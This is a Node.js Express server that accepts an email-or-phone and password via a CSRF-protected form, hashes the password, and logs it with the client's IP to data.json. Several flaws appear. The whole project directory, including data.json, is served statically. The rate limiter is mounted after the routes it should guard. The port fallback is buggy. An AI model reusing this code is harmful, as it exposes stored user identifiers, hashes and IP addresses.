const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const csrf = require('csurf');
const bcrypt = require('bcrypt');
const cookieParser = require('cookie-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
        },
    },
}));
app.use(express.json({ limit: '10kb' }));
app.use(express.static(__dirname)); // Serve static files (HTML, CSS, JS)
app.use(cookieParser());

// CSRF protection with cookie options
const csrfProtection = csrf({
    cookie: {
        httpOnly: true,
        secure: false, // Set to true in production with HTTPS
        sameSite: 'strict',
        key: '_csrf'
    }
});

// Apply CSRF protection to all routes after static files
app.use(csrfProtection);

// Serve CSRF token endpoint
app.get('/csrf-token', (req, res) => {
    const token = req.csrfToken();
    console.log('Generated CSRF token:', token); // Debug log
    res.json({ csrfToken: token });
});

// Handle form submission and save to data.json
app.post('/submit', csrfProtection, async (req, res) => {
    try {
        const { emailOrPhone, password, timestamp } = req.body;

        // Server-side validation
        if (!emailOrPhone || !password || !timestamp) {
            return res.status(400).json({ message: 'Missing required fields' });
        }
        if (typeof emailOrPhone !== 'string' || typeof password !== 'string') {
            return res.status(400).json({ message: 'Invalid input type' });
        }

        const dataFile = path.join(__dirname, 'data.json');

        // Initialize data.json if it doesn’t exist
        try {
            await fs.access(dataFile);
        } catch {
            await fs.writeFile(dataFile, '[]', 'utf8');
        }

        // Read existing data
        const fileContent = await fs.readFile(dataFile, 'utf8');
        let existingData = JSON.parse(fileContent || '[]');
        if (!Array.isArray(existingData)) existingData = [];

        // Hash the password
        const hashedPassword = await bcrypt.hash(password, 10);

        // Create new entry
        const newEntry = {
            emailOrPhone,
            password: hashedPassword,
            timestamp,
            ip: req.ip
        };

        // Add to data and save
        existingData.push(newEntry);
        await fs.writeFile(dataFile, JSON.stringify(existingData, null, 2), 'utf8');

        res.status(200).json({ message: 'Data saved successfully' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ 
            message: 'Internal server error',
            error: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
});

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100,
    message: { message: 'Too many requests, please try again later.' }
});
app.use(limiter);

// Error handling
app.use((err, req, res, next) => {
    if (err.code === 'EBADCSRFTOKEN') {
        console.log('CSRF token validation failed');
        return res.status(403).json({ message: 'Invalid CSRF token' });
    }
    console.error(err.stack);
    res.status(500).json({ message: 'Something went wrong!' });
});

// Start server
const server = app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
}).on('error', async (err) => {
    if (err.code === 'EADDRINUSE') {
        console.log(`Port ${PORT} in use, trying ${PORT + 1}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
        server.listen(PORT + 1);
    }
});

process.on('SIGTERM', () => {
    console.log('SIGTERM received. Shutting down gracefully...');
    server.close(() => {
        console.log('Process terminated');
        process.exit(0);
    });
});